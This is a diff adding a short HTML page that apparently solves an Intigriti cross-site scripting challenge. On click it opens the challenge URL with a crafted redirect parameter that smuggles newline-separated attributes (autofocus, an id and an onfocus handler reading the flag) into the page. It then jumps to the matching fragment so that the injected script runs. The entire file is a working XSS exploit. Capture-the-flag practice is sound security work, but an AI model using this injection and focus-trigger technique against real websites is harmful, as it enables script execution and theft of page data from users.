@@ -1,0 +1,14 @@
+
+<body onclick=j()>
+
+<h1>Click Anywhere</h1>
+
+<script>
+function j(){
+let s ='https://challenge-0121.intigriti.io/?r=https://httpstat.us/200?sleep=10000%26%0aautofocus%0aid=x%0aonfocus=alert(flag.innerText)//'
+let x = window.open(s,'x')
+setTimeout(function(){
+x.location=s+'#x';
+},6500)
+}
+</script>
